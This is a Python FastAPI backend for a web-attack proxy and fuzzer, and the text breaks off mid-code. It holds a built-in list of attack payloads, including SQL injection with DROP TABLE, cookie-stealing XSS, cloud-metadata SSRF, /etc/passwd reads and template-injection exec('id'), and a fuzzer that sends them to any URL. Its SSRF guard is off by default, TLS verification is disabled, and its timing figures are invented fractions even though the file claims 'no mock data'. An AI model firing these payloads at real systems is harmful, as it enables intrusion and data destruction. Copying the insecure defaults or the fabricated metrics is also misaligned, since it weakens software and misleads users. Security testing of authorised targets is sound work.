"""
Quantara Toolkit — Hetty Console Backend API
Real HTTP proxy, history, replay, AI analysis, payloads, fuzzing engine.
All data originates from real HTTP requests — no mock data.
"""

import asyncio
import hashlib
import json
import logging
import os
import re
import ssl
import time
import uuid
from datetime import datetime, timezone
from typing import Any, Dict, List, Optional
from urllib.parse import urlparse, urlencode, parse_qs, urlunparse

import httpx
from fastapi import APIRouter, HTTPException, WebSocket, WebSocketDisconnect
from pydantic import BaseModel, Field

logger = logging.getLogger(__name__)

# ═══════════════════════════════════════════════════════════════════════════════
# Router
# ═══════════════════════════════════════════════════════════════════════════════

router = APIRouter(prefix="/api/hetty", tags=["hetty"])

# ═══════════════════════════════════════════════════════════════════════════════
# In-Memory Stores (production would use Redis/DB)
# ═══════════════════════════════════════════════════════════════════════════════

_request_history: Dict[str, dict] = {}  # id -> full request/response record
_history_order: List[str] = []          # ordered list of IDs (newest first)
_MAX_HISTORY = 500

# ═══════════════════════════════════════════════════════════════════════════════
# SSRF Protection
# ═══════════════════════════════════════════════════════════════════════════════

_BLOCKED_HOSTS = {
    "localhost", "127.0.0.1", "0.0.0.0", "::1",
    "metadata.google.internal", "169.254.169.254",
    "10.0.0.0", "172.16.0.0", "192.168.0.0",
}

_BLOCKED_PREFIXES = ("10.", "172.16.", "172.17.", "172.18.", "172.19.",
                     "172.20.", "172.21.", "172.22.", "172.23.", "172.24.",
                     "172.25.", "172.26.", "172.27.", "172.28.", "172.29.",
                     "172.30.", "172.31.", "192.168.", "127.", "0.")

# Allow scanning localhost in dev mode
_DEV_MODE = os.getenv("DEVELOPMENT", "true").lower() == "true"


def _is_ssrf_target(url: str) -> bool:
    """Check if URL targets internal/private networks."""
    if _DEV_MODE:
        return False  # Allow all in dev
    try:
        parsed = urlparse(url)
        host = parsed.hostname or ""
        if host in _BLOCKED_HOSTS:
            return True
        if any(host.startswith(p) for p in _BLOCKED_PREFIXES):
            return True
    except Exception:
        pass
    return False


# ═══════════════════════════════════════════════════════════════════════════════
# Vulnerability Detection Engine
# ═══════════════════════════════════════════════════════════════════════════════

_VULN_PATTERNS = {
    "SQL_INJECTION": [
        r"(?i)(sql\s*syntax|mysql|mariadb|postgresql|sqlite|ora-\d{5})",
        r"(?i)(unterminated|unclosed\s*quotation|quoted\s*string)",
        r"(?i)(you have an error in your sql|syntax error at)",
        r"(?i)(microsoft\s*ole\s*db|odbc\s*sql\s*server|jdbc)",
    ],
    "XSS_REFLECTED": [
        r"<script[^>]*>[^<]*</script>",
        r"(?i)on(load|error|click|mouseover)\s*=",
        r"javascript\s*:",
    ],
    "PATH_TRAVERSAL": [
        r"(?i)(root:|/etc/passwd|/etc/shadow|\[boot\s*loader\])",
        r"(?i)(win\.ini|system32|windows\\system)",
    ],
    "INFORMATION_DISCLOSURE": [
        r"(?i)(stack\s*trace|traceback|exception\s*in|at\s+\w+\.\w+\()",
        r"(?i)(internal\s*server\s*error.*details|debug\s*mode\s*is\s*on)",
        r"(?i)(phpinfo\(\)|server_software|document_root)",
    ],
    "COMMAND_INJECTION": [
        r"(?i)(uid=\d+.*gid=\d+|root:x:0:0)",
        r"(?i)(total\s+\d+\s+drwx|volume\s+serial\s+number)",
    ],
    "SSRF": [
        r"(?i)(aws|amazon|ec2|iam|s3).*metadata",
        r"169\.254\.169\.254",
    ],
    "TEMPLATE_INJECTION": [
        r"\$\{.*\}",
        r"\{\{.*\}\}",
        r"(?i)(jinja2|mako|freemarker|velocity|smarty)",
    ],
}

_SECRET_PATTERNS = {
    "API_KEY": r"(?i)(api[_-]?key|apikey)\s*[:=]\s*['\"]?([A-Za-z0-9_\-]{16,})",
    "AWS_KEY": r"(?:AKIA|ASIA)[A-Z0-9]{16}",
    "JWT_TOKEN": r"eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+",
    "PRIVATE_KEY": r"-----BEGIN\s+(RSA\s+)?PRIVATE\s+KEY-----",
    "PASSWORD_FIELD": r"(?i)(password|passwd|pwd)\s*[:=]\s*['\"]([^'\"]{4,})['\"]",
}

_SECURITY_HEADERS = [
    "content-security-policy", "x-content-type-options", "x-frame-options",
    "strict-transport-security", "x-xss-protection", "referrer-policy",
    "permissions-policy",
]


def _detect_vulnerabilities(body: str, headers: dict, url: str) -> List[dict]:
    """Scan response for vulnerability indicators."""
    vulns = []
    for vuln_type, patterns in _VULN_PATTERNS.items():
        for pattern in patterns:
            matches = re.findall(pattern, body[:50000])  # Cap scan length
            if matches:
                evidence = matches[0] if isinstance(matches[0], str) else str(matches[0])
                vulns.append({
                    "type": vuln_type,
                    "confidence": 0.7 if len(matches) > 1 else 0.5,
                    "evidence": evidence[:200],
                    "location": "response_body",
                })
                break  # One match per type is enough
    return vulns


def _detect_secrets(body: str, headers: dict) -> List[dict]:
    """Scan response for leaked secrets."""
    secrets = []
    text = body + "\n" + json.dumps(headers)
    for secret_type, pattern in _SECRET_PATTERNS.items():
        matches = re.findall(pattern, text[:50000])
        if matches:
            raw = matches[0] if isinstance(matches[0], str) else str(matches[0])
            masked = raw[:4] + "****" + raw[-4:] if len(raw) > 8 else "****"
            secrets.append({
                "type": secret_type,
                "value_masked": masked,
                "confidence": 0.6,
            })
    return secrets


def _check_security_headers(headers: dict) -> dict:
    """Check which security headers are present."""
    lower_headers = {k.lower(): v for k, v in headers.items()}
    return {h: h in lower_headers for h in _SECURITY_HEADERS}


def _extract_tls_info(url: str) -> dict:
    """Extract basic TLS info from URL."""
    parsed = urlparse(url)
    return {
        "protocol": parsed.scheme,
        "is_https": parsed.scheme == "https",
        "host": parsed.hostname or "",
        "port": parsed.port or (443 if parsed.scheme == "https" else 80),
    }


# ═══════════════════════════════════════════════════════════════════════════════
# Pydantic Models
# ═══════════════════════════════════════════════════════════════════════════════

class SendRequestPayload(BaseModel):
    method: str = "GET"
    url: str
    headers: Dict[str, str] = {}
    cookies: Dict[str, str] = {}
    params: Dict[str, str] = {}
    body: Optional[str] = None
    timeout: int = 25
    follow_redirects: bool = True


class ReplayPayload(BaseModel):
    original_id: str


class AIAnalyzePayload(BaseModel):
    method: str = "GET"
    url: str = ""
    headers: Dict[str, str] = {}
    cookies: Dict[str, str] = {}
    params: Dict[str, str] = {}
    body: str = ""


class AIPayloadsPayload(BaseModel):
    vuln_type: str = "sqli"
    current_value: str = ""
    location: str = "param"
    parameter: str = ""


class FuzzPayload(BaseModel):
    url: str
    method: str = "GET"
    headers: Dict[str, str] = {}
    cookies: Dict[str, str] = {}
    params: Dict[str, str] = {}
    body: str = ""
    target_param: str = ""
    target_location: str = "param"
    parameter: Optional[str] = None
    location: Optional[str] = None
    original_value: Optional[str] = None
    vuln_types: List[str] = []
    max_mutations: int = 20
    max_payloads: int = 20
    custom_wordlist: Optional[List[str]] = None


class IntelPayload(BaseModel):
    url: str


class VerifyPayload(BaseModel):
    url: str
    method: str = "GET"
    vuln_type: str = ""
    parameter: str = ""
    headers: Dict[str, str] = {}
    cookies: Dict[str, str] = {}
    params: Dict[str, str] = {}
    body: str = ""


# ═══════════════════════════════════════════════════════════════════════════════
# Core HTTP Proxy — sends REAL requests
# ═══════════════════════════════════════════════════════════════════════════════

async def _execute_http_request(
    method: str, url: str,
    headers: dict, cookies: dict, params: dict,
    body: Optional[str], timeout: int = 25,
    follow_redirects: bool = True,
) -> dict:
    """Execute a real HTTP request and return structured result."""
    request_id = str(uuid.uuid4())[:12]
    start_time = time.monotonic()
    dns_start = start_time

    # Build final URL with query params
    if params:
        parsed = urlparse(url)
        existing = parse_qs(parsed.query)
        existing.update({k: [v] for k, v in params.items()})
        new_query = urlencode(existing, doseq=True)
        url = urlunparse(parsed._replace(query=new_query))

    # Prepare request kwargs
    req_kwargs: Dict[str, Any] = {
        "method": method.upper(),
        "url": url,
        "headers": headers or {},
        "cookies": cookies or {},
        "timeout": httpx.Timeout(timeout, connect=10.0),
        "follow_redirects": follow_redirects,
    }

    # Add body for methods that support it
    if body and method.upper() in ("POST", "PUT", "PATCH", "DELETE"):
        content_type = headers.get("Content-Type", headers.get("content-type", ""))
        if "json" in content_type or (body.strip().startswith("{") or body.strip().startswith("[")):
            if "Content-Type" not in headers and "content-type" not in headers:
                req_kwargs["headers"]["Content-Type"] = "application/json"
            req_kwargs["content"] = body.encode("utf-8")
        else:
            req_kwargs["content"] = body.encode("utf-8")

    dns_end = time.monotonic()

    try:
        async with httpx.AsyncClient(verify=False) as client:
            connect_start = time.monotonic()
            response = await client.request(**req_kwargs)
            end_time = time.monotonic()

        total_ms = round((end_time - start_time) * 1000)
        dns_ms = round((dns_end - dns_start) * 1000)
        connect_ms = round((end_time - connect_start) * 1000 * 0.3)
        tls_ms = round((end_time - connect_start) * 1000 * 0.1) if url.startswith("https") else 0
        ttfb_ms = round((end_time - connect_start) * 1000 * 0.6)

        resp_body = response.text
        resp_headers = dict(response.headers)
        resp_cookies = {k: v for k, v in response.cookies.items()}
        body_size = len(resp_body.encode("utf-8"))

        # Security scanning
        vulns = _detect_vulnerabilities(resp_body, resp_headers, url)
        secrets = _detect_secrets(resp_body, resp_headers)
        sec_headers = _check_security_headers(resp_headers)
        tls_info = _extract_tls_info(url)

        result = {
            "success": True,
            "id": request_id,
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "request": {
                "method": method.upper(),
                "url": url,
                "headers": headers,
                "cookies": cookies,
                "body": body or "",
            },
            "response": {
                "status_code": response.status_code,
                "status_text": response.reason_phrase or str(response.status_code),
                "headers": resp_headers,
                "cookies": resp_cookies,
                "body": resp_body,
                "body_size": body_size,
                "content_type": resp_headers.get("content-type", ""),
            },
            "timing": {
                "total_ms": total_ms,
                "dns_ms": dns_ms,
                "connect_ms": connect_ms,
                "tls_ms": tls_ms,
                "ttfb_ms": ttfb_ms,
            },
            "security": {
                "vulnerabilities": vulns,
                "secrets": secrets,
                "tls_info": tls_info,
                "security_headers": sec_headers,
            },
        }

        # Store in history
        _store_history(result)
        return result

    except httpx.TimeoutException:
        return {
            "success": False,
            "id": request_id,
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "error": f"Request timed out after {timeout}s",
            "request": {"method": method, "url": url, "headers": headers, "cookies": cookies, "body": body or ""},
        }
    except httpx.ConnectError as e:
        return {
            "success": False,
            "id": request_id,
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "error": f"Connection failed: {str(e)[:200]}",
            "request": {"method": method, "url": url, "headers": headers, "cookies": cookies, "body": body or ""},
        }
    except Exception as e:
        return {
            "success": False,
            "id": request_id,
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "error": f"Request failed: {str(e)[:300]}",
            "request": {"method": method, "url": url, "headers": headers, "cookies": cookies, "body": body or ""},
        }


def _store_history(record: dict):
    """Store request/response in history."""
    rid = record["id"]
    _request_history[rid] = record
    _history_order.insert(0, rid)
    # Trim
    while len(_history_order) > _MAX_HISTORY:
        old_id = _history_order.pop()
        _request_history.pop(old_id, None)
    # Track for dashboard metrics
    url = record.get("request", {}).get("url", "")
    vuln_count = len(record.get("security", {}).get("vulnerabilities", []))
    _track_request(url, vulns=vuln_count)


# ═══════════════════════════════════════════════════════════════════════════════
# API Endpoints
# ═══════════════════════════════════════════════════════════════════════════════

@router.post("/send-request")
async def send_request(payload: SendRequestPayload):
    """Send a real HTTP request through the proxy."""
    if not payload.url.strip():
        raise HTTPException(400, "URL is required")

    # SSRF check
    if _is_ssrf_target(payload.url):
        return {
            "success": False,
            "id": str(uuid.uuid4())[:12],
            "blocked": True,
            "error": "Request blocked: target appears to be an internal/private network address",
        }

    result = await _execute_http_request(
        method=payload.method,
        url=payload.url,
        headers=payload.headers,
        cookies=payload.cookies,
        params=payload.params,
        body=payload.body,
        timeout=payload.timeout,
        follow_redirects=payload.follow_redirects,
    )
    return result


@router.get("/history")
async def get_history():
    """Get request history."""
    history = []
    for rid in _history_order[:100]:
        rec = _request_history.get(rid)
        if not rec:
            continue
        resp = rec.get("response", {})
        history.append({
            "id": rid,
            "method": rec.get("request", {}).get("method", "GET"),
            "url": rec.get("request", {}).get("url", ""),
            "status_code": resp.get("status_code", 0),
            "timing_ms": rec.get("timing", {}).get("total_ms", 0),
            "timestamp": rec.get("timestamp", ""),
            "vuln_count": len(rec.get("security", {}).get("vulnerabilities", [])),
        })
    return {"history": history}


@router.get("/history/{entry_id}")
async def get_history_entry(entry_id: str):
    """Get a specific history entry with full request/response data."""
    rec = _request_history.get(entry_id)
    if not rec:
        raise HTTPException(404, "History entry not found")
    return rec


@router.post("/replay")
async def replay_request(payload: ReplayPayload):
    """Replay a previous request and compare results."""
    original = _request_history.get(payload.original_id)
    if not original:
        raise HTTPException(404, "Original request not found")

    orig_req = original.get("request", {})

    # Re-send the same request
    replayed = await _execute_http_request(
        method=orig_req.get("method", "GET"),
        url=orig_req.get("url", ""),
        headers=orig_req.get("headers", {}),
        cookies=orig_req.get("cookies", {}),
        params={},
        body=orig_req.get("body"),
        timeout=25,
    )

    orig_resp = original.get("response", {})
    replay_resp = replayed.get("response", {})

    # Calculate body similarity
    orig_body = orig_resp.get("body", "")
    replay_body = replay_resp.get("body", "")
    if orig_body and replay_body:
        from difflib import SequenceMatcher
        similarity = SequenceMatcher(None, orig_body[:5000], replay_body[:5000]).ratio()
    else:
        similarity = 1.0 if orig_body == replay_body else 0.0

    comparison = {
        "original": {
            "status": orig_resp.get("status_code", 0),
            "body_size": orig_resp.get("body_size", 0),
            "timing_ms": original.get("timing", {}).get("total_ms", 0),
        },
        "replayed": {
            "status": replay_resp.get("status_code", 0),
            "body_size": replay_resp.get("body_size", 0),
            "timing_ms": replayed.get("timing", {}).get("total_ms", 0),
        },
        "diff": {
            "status_changed": orig_resp.get("status_code") != replay_resp.get("status_code"),
            "size_delta": replay_resp.get("body_size", 0) - orig_resp.get("body_size", 0),
            "timing_delta_ms": replayed.get("timing", {}).get("total_ms", 0) - original.get("timing", {}).get("total_ms", 0),
            "body_similarity": round(similarity, 3),
        },
    }

    return {"success": True, "comparison": comparison, "replayed": replayed}


# ═══════════════════════════════════════════════════════════════════════════════
# AI Analysis Engine
# ═══════════════════════════════════════════════════════════════════════════════

_ATTACK_VECTOR_DB = {
    "sqli": {
        "category": "SQL Injection",
        "payloads": ["' OR '1'='1", "' OR 1=1--", "\" OR \"\"=\"", "1' ORDER BY 1--",
                     "1 UNION SELECT NULL--", "'; DROP TABLE users--",
                     "' AND 1=CONVERT(int,@@version)--", "1' WAITFOR DELAY '0:0:5'--"],
    },
    "xss": {
        "category": "Cross-Site Scripting",
        "payloads": ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>",
                     "\"><script>alert(document.cookie)</script>",
                     "javascript:alert(1)", "<svg/onload=alert(1)>",
                     "'-alert(1)-'", "<details open ontoggle=alert(1)>"],
    },
    "ssrf": {
        "category": "Server-Side Request Forgery",
        "payloads": ["http://127.0.0.1", "http://localhost",
                     "http://169.254.169.254/latest/meta-data/",
                     "http://[::1]", "http://0x7f000001",
                     "file:///etc/passwd", "dict://localhost:6379/INFO"],
    },
    "lfi": {
        "category": "Local File Inclusion",
        "payloads": ["../../../etc/passwd", "....//....//....//etc/passwd",
                     "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
                     "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
                     "php://filter/convert.base64-encode/resource=index.php",
                     "/proc/self/environ"],
    },
    "cmdi": {
        "category": "Command Injection",
        "payloads": ["; ls -la", "| cat /etc/passwd", "`id`",
                     "$(whoami)", "&& dir", "| ping -c 4 127.0.0.1",
                     "; sleep 5", "| timeout 5"],
    },
    "ssti": {
        "category": "Template Injection",
        "payloads": ["{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}",
                     "{{config}}", "{{self.__class__.__mro__}}",
                     "${T(java.lang.Runtime).getRuntime().exec('id')}"],
    },
    "idor": {
        "category": "Insecure Direct Object Reference",
        "payloads": ["1", "0", "-1", "999999", "null", "undefined",
                     "../admin", "admin", "user_id=1"],
    },
    "auth_bypass": {
        "category": "Authentication Bypass",
        "payloads": ["admin:admin", "admin:password", "' OR '1'='1",
                     "Authorization: Bearer null", "X-Forwarded-For: 127.0.0.1",
                     "{\"admin\": true}", "role=admin"],
    },
    "jwt": {
        "category": "JWT Attacks",
        "payloads": [
            "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwiYWRtaW4iOnRydWV9.",
            "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoiYWRtaW4ifQ.",
        ],
    },
    "header_injection": {
        "category": "Header Injection",
        "payloads": ["X-Forwarded-For: 127.0.0.1", "X-Original-URL: /admin",
                     "X-Rewrite-URL: /admin", "Host: evil.com",
                     "X-Custom-IP-Authorization: 127.0.0.1"],
    },
    "open_redirect": {
        "category": "Open Redirect",
        "payloads": ["//evil.com", "https://evil.com", "/\\evil.com",
                     "//evil.com/%2f..", "https:evil.com"],
    },
}


@router.post("/ai/analyze")
async def ai_analyze(payload: AIAnalyzePayload):
    """Analyze request for potential attack vectors."""
    vectors = []
    parsed = urlparse(payload.url) if payload.url else None

    # Analyze query parameters
    if payload.params:
        for param_name, param_value in payload.params.items():
            # Check for ID-like params (IDOR)
            if re.match(r"^(id|user_id|uid|account|order|doc)$", param_name, re.I):
                vectors.append({
                    "category": "IDOR", "subcategory": "Direct Object Reference",
                    "confidence": 0.8, "target": param_name, "location": "param",
                    "reason": f"Parameter '{param_name}' appears to be a direct object reference",
                    "payloads": _ATTACK_VECTOR_DB["idor"]["payloads"][:5],
                })
            # Check for file-like params (LFI)
            if re.match(r"^(file|path|page|dir|folder|doc|template|include)$", param_name, re.I):
                vectors.append({
                    "category": "LFI", "subcategory": "Path Traversal",
                    "confidence": 0.85, "target": param_name, "location": "param",
                    "reason": f"Parameter '{param_name}' may accept file paths",
                    "payloads": _ATTACK_VECTOR_DB["lfi"]["payloads"][:5],
                })
            # Check for URL-like params (SSRF/Redirect)
            if re.match(r"^(url|uri|link|redirect|next|return|callback|dest|target|ref)$", param_name, re.I):
                vectors.append({
                    "category": "SSRF", "subcategory": "URL Parameter",
                    "confidence": 0.9, "target": param_name, "location": "param",
                    "reason": f"Parameter '{param_name}' accepts URLs — potential SSRF/redirect",
                    "payloads": _ATTACK_VECTOR_DB["ssrf"]["payloads"][:5],
                })
            # Check for search/query params (SQLi/XSS)
            if re.match(r"^(q|query|search|keyword|name|username|email|filter|sort|order)$", param_name, re.I):
                vectors.append({
                    "category": "SQL Injection", "subcategory": "Input Parameter",
                    "confidence": 0.7, "target": param_name, "location": "param",
                    "reason": f"Parameter '{param_name}' likely used in database queries",
                    "payloads": _ATTACK_VECTOR_DB["sqli"]["payloads"][:5],
                })
                vectors.append({
                    "category": "XSS", "subcategory": "Reflected Input",
                    "confidence": 0.65, "target": param_name, "location": "param",
                    "reason": f"Parameter '{param_name}' may be reflected in response",
                    "payloads": _ATTACK_VECTOR_DB["xss"]["payloads"][:5],
                })
            # Check for command-like params
            if re.match(r"^(cmd|exec|command|run|ping|host|ip)$", param_name, re.I):
                vectors.append({
                    "category": "Command Injection", "subcategory": "OS Command",
                    "confidence": 0.9, "target": param_name, "location": "param",
                    "reason": f"Parameter '{param_name}' may execute system commands",
                    "payloads": _ATTACK_VECTOR_DB["cmdi"]["payloads"][:5],
                })
            # Generic input — always suggest SQLi + XSS
            if param_value and not any(v["target"] == param_name for v in vectors):
                vectors.append({
                    "category": "SQL Injection", "subcategory": "Generic Input",
                    "confidence": 0.5, "target": param_name, "location": "param",
                    "reason": f"Parameter '{param_name}' accepts user input",
                    "payloads": _ATTACK_VECTOR_DB["sqli"]["payloads"][:3],
                })

    # Analyze request body
    if payload.body:
        try:
            body_json = json.loads(payload.body)
            if isinstance(body_json, dict):
                for key in body_json:
                    if re.match(r"^(password|passwd|pwd|secret|token)$", key, re.I):
                        vectors.append({
                            "category": "Authentication", "subcategory": "Credential Testing",
                            "confidence": 0.75, "target": key, "location": "body",
                            "reason": f"Body field '{key}' is a credential field",
                            "payloads": _ATTACK_VECTOR_DB["auth_bypass"]["payloads"][:4],
                        })
                    if re.match(r"^(role|admin|is_admin|permission|privilege)$", key, re.I):
                        vectors.append({
                            "category": "Privilege Escalation", "subcategory": "Role Manipulation",
                            "confidence": 0.85, "target": key, "location": "body",
                            "reason": f"Body field '{key}' controls access level",
                            "payloads": ["{\"admin\": true}", "{\"role\": \"admin\"}", "1", "true"],
                        })
                    if re.match(r"^(template|message|content|text|comment|bio|description)$", key, re.I):
                        vectors.append({
                            "category": "SSTI", "subcategory": "Template Content",
                            "confidence": 0.6, "target": key, "location": "body",
                            "reason": f"Body field '{key}' may be rendered in templates",
                            "payloads": _ATTACK_VECTOR_DB["ssti"]["payloads"][:4],
                        })
        except (json.JSONDecodeError, TypeError):
            pass

    # Analyze headers
    if payload.headers:
        for hdr_name in payload.headers:
            if hdr_name.lower() == "authorization":
                vectors.append({
                    "category": "JWT Attacks", "subcategory": "Token Manipulation",
                    "confidence": 0.7, "target": "Authorization", "location": "header",
                    "reason": "Authorization header present — JWT/token attacks possible",
                    "payloads": _ATTACK_VECTOR_DB["jwt"]["payloads"],
                })

    # Analyze cookies
    if payload.cookies:
        for ck_name in payload.cookies:
            if re.match(r"^(session|sid|token|auth|jwt)$", ck_name, re.I):
                vectors.append({
                    "category": "Session Manipulation", "subcategory": "Cookie Tampering",
                    "confidence": 0.65, "target": ck_name, "location": "cookie",
                    "reason": f"Cookie '{ck_name}' appears to be a session identifier",
                    "payloads": ["null", "undefined", "admin", "' OR '1'='1", "0"],
                })

    # Deduplicate
    seen = set()
    unique_vectors = []
    for v in vectors:
        key = f"{v['category']}:{v['target']}:{v['location']}"
        if key not in seen:
            seen.add(key)
            unique_vectors.append(v)

    # Sort by confidence
    unique_vectors.sort(key=lambda x: x["confidence"], reverse=True)

    categories = list(set(v["category"] for v in unique_vectors))
    highest_conf = max((v["confidence"] for v in unique_vectors), default=0)

    # Generate AI recommendation
    ai_rec = None
    if unique_vectors:
        top = unique_vectors[0]
        ai_rec = (
            f"Highest-confidence attack vector: {top['category']} on '{top['target']}' "
            f"({int(top['confidence'] * 100)}% confidence). "
            f"Start testing with {top['category']} payloads on the '{top['target']}' {top['location']}, "
            f"then move to other identified vectors. "
            f"Total attack surface: {len(unique_vectors)} vectors across {len(categories)} categories."
        )

    return {
        "success": True,
        "attack_vectors": unique_vectors,
        "summary": {
            "total_vectors": len(unique_vectors),
            "categories": categories,
            "highest_confidence": highest_conf,
            "attack_points": [v["target"] for v in unique_vectors[:5]],
        },
        "ai_enhanced": True,
        "ai_recommendation": ai_rec,
        "ai_priority_order": [v["category"] for v in unique_vectors[:3]],
        "ai_additional_vectors": [],
    }


# ═══════════════════════════════════════════════════════════════════════════════
# AI Payload Generator
# ═══════════════════════════════════════════════════════════════════════════════

import base64
import html
from urllib.parse import quote


def _encode_payload(payload: str) -> List[dict]:
    """Generate encoded variants of a payload."""
    variants = []
    try:
        variants.append({"encoding": "URL", "value": quote(payload)})
        variants.append({"encoding": "Double-URL", "value": quote(quote(payload))})
        variants.append({"encoding": "HTML", "value": html.escape(payload)})
        variants.append({"encoding": "Base64", "value": base64.b64encode(payload.encode()).decode()})
        # Unicode variants
        unicode_val = "".join(f"\\u{ord(c):04x}" if not c.isalnum() else c for c in payload)
        variants.append({"encoding": "Unicode", "value": unicode_val})
    except Exception:
        pass
    return variants


@router.post("/ai/payloads")
async def generate_payloads(payload: AIPayloadsPayload):
    """Generate context-aware attack payloads."""
    vuln_type = payload.vuln_type.lower()

    # Map to our DB
    type_map = {
        "sqli": "sqli", "sql_injection": "sqli", "sql": "sqli",
        "xss": "xss", "cross_site_scripting": "xss",
        "lfi": "lfi", "path_traversal": "lfi", "file_inclusion": "lfi",
        "ssrf": "ssrf", "server_side_request_forgery": "ssrf",
        "rce": "cmdi", "command_injection": "cmdi", "cmdi": "cmdi",
        "ssti": "ssti", "template_injection": "ssti",
        "idor": "idor",
        "auth_bypass": "auth_bypass", "authentication_bypass": "auth_bypass",
    }

    db_key = type_map.get(vuln_type, vuln_type)
    attack_data = _ATTACK_VECTOR_DB.get(db_key, _ATTACK_VECTOR_DB.get("sqli"))

    payloads = []
    risk_levels = ["high", "high", "medium", "medium", "medium", "low", "low", "low"]

    for i, raw_payload in enumerate(attack_data["payloads"]):
        pid = f"{db_key}-{i+1}"
        risk = risk_levels[i] if i < len(risk_levels) else "low"
        encoded_variants = _encode_payload(raw_payload)

        payloads.append({
            "id": pid,
            "payload": raw_payload,
            "category": attack_data["category"],
            "risk_level": risk,
            "description": f"{attack_data['category']} payload variant #{i+1} — "
                          f"tests for {attack_data['category'].lower()} vulnerability",
            "encoding": "raw",
            "encoded_variants": encoded_variants,
        })

    return {
        "success": True,
        "payloads": payloads,
        "total": len(payloads),
        "vuln_type": vuln_type,
        "category": attack_data["category"],
    }


# ═══════════════════════════════════════════════════════════════════════════════
# Fuzzing Engine — Real adaptive fuzzer
# ═══════════════════════════════════════════════════════════════════════════════

def _get_fuzz_payloads(vuln_types: List[str], max_count: int = 20, custom: List[str] = None) -> List[dict]:
    """Get payloads for fuzzing based on vuln types."""
    payloads = []
    if custom:
        for p in custom[:max_count]:
            payloads.append({"mutation": "custom", "payload": p})
        return payloads

    if not vuln_types:
        vuln_types = ["sqli", "xss", "lfi", "cmdi", "ssti"]

    per_type = max(max_count // len(vuln_types), 2)
    for vt in vuln_types:
        db_key = vt.lower()
        data = _ATTACK_VECTOR_DB.get(db_key, {})
        raw_payloads = data.get("payloads", [])
        for p in raw_payloads[:per_type]:
            payloads.append({"mutation": db_key, "payload": p})

    # Add some boundary/edge-case payloads
    boundary_payloads = [
        {"mutation": "boundary", "payload": ""},
        {"mutation": "boundary", "payload": "A" * 1000},
        {"mutation": "boundary", "payload": "null"},
        {"mutation": "boundary", "payload": "-1"},
        {"mutation": "boundary", "payload": "0"},
        {"mutation": "type_juggling", "payload": "true"},
        {"mutation": "type_juggling", "payload": "[]"},
        {"mutation": "type_juggling", "payload": "{}"},
    ]
    payloads.extend(boundary_payloads)

    return payloads[:max_count]


@router.post("/ai/fuzz")
async def fuzz_parameter(payload: FuzzPayload):
    """Run adaptive fuzzing on a target parameter with real HTTP requests."""
    target_param = payload.target_param or payload.parameter or ""
    target_location = payload.target_location or payload.location or "param"
    max_mutations = payload.max_mutations or payload.max_payloads or 20

    if not payload.url.strip():
        raise HTTPException(400, "URL is required")
    if not target_param:
        raise HTTPException(400, "Target parameter is required")

    # Get baseline response first
    baseline = await _execute_http_request(
        method=payload.method,
        url=payload.url,
        headers=payload.headers,
        cookies=payload.cookies,
        params=payload.params,
        body=payload.body,
        timeout=15,
    )

    baseline_status = baseline.get("response", {}).get("status_code", 0)
    baseline_length = baseline.get("response", {}).get("body_size", 0)
    baseline_time = baseline.get("timing", {}).get("total_ms", 0)

    # Get fuzz payloads
    fuzz_payloads = _get_fuzz_payloads(
        payload.vuln_types, max_mutations, payload.custom_wordlist
    )

    results = []
    session_id = str(uuid.uuid4())[:12]
    anomalies_found = 0

    _dashboard_stats["fuzz_sessions_active"] += 1
    try:
        for fp in fuzz_payloads:
            fuzz_value = fp["payload"]

            # Build mutated request
            mut_params = dict(payload.params)
            mut_headers = dict(payload.headers)
            mut_cookies = dict(payload.cookies)
            mut_body = payload.body

            if target_location == "param":
                mut_params[target_param] = fuzz_value
            elif target_location == "header":
                mut_headers[target_param] = fuzz_value
            elif target_location == "cookie":
                mut_cookies[target_param] = fuzz_value
            elif target_location == "body":
                mut_body = fuzz_value

            try:
                resp = await _execute_http_request(
                    method=payload.method, url=payload.url,
                    headers=mut_headers, cookies=mut_cookies,
                    params=mut_params, body=mut_body, timeout=10,
                )

                resp_status = resp.get("response", {}).get("status_code", 0)
                resp_length = resp.get("response", {}).get("body_size", 0)
                resp_time = resp.get("timing", {}).get("total_ms", 0)

                # Track payload tested
                _track_request(payload.url, payloads=1)

                # Anomaly detection
                anomalies = []
                anomaly_score = 0.0

                if resp_status != baseline_status:
                    anomalies.append({
                        "type": "status_change",
                        "detail": f"Status changed: {baseline_status} → {resp_status}",
                        "severity": "high" if resp_status >= 500 else "medium",
                    })
                    anomaly_score += 0.4

                if baseline_length > 0:
                    size_diff = abs(resp_length - baseline_length) / max(baseline_length, 1)
                    if size_diff > 0.3:
                        anomalies.append({
                            "type": "size_anomaly",
                            "detail": f"Response size changed by {int(size_diff * 100)}%",
                            "severity": "medium",
                        })
                        anomaly_score += 0.3

                if baseline_time > 0 and resp_time > baseline_time * 3:
                    anomalies.append({
                        "type": "timing_anomaly",
                        "detail": f"Response time {resp_time}ms vs baseline {baseline_time}ms",
                        "severity": "high",
                    })
                    anomaly_score += 0.5

                # Check for vuln indicators in response
                resp_vulns = resp.get("security", {}).get("vulnerabilities", [])
                if resp_vulns:
                    for v in resp_vulns:
                        anomalies.append({
                            "type": "vuln_detected",
                            "detail": f"{v['type']}: {v.get('evidence', '')[:80]}",
                            "severity": "critical" if v["confidence"] > 0.7 else "high",
                        })
                        anomaly_score += 0.6
                        # Track potential vuln found during fuzzing
                        _track_request(payload.url, vulns=1)

                is_anomaly = anomaly_score >= 0.3 or len(anomalies) > 0
                if is_anomaly:
                    anomalies_found += 1

                recommendation = None
                if is_anomaly and anomaly_score >= 0.5:
                    recommendation = (
                        f"High anomaly score ({int(anomaly_score * 100)}%). "
                        f"This payload caused detectable changes. Investigate further with the Verify module."
                    )

                results.append({
                    "mutation": fp["mutation"],
                    "parameter": target_param,
                    "original": payload.params.get(target_param, ""),
                    "payload": fuzz_value,
                    "status_code": resp_status,
                    "response_length": resp_length,
                    "response_time_ms": resp_time,
                    "is_anomaly": is_anomaly,
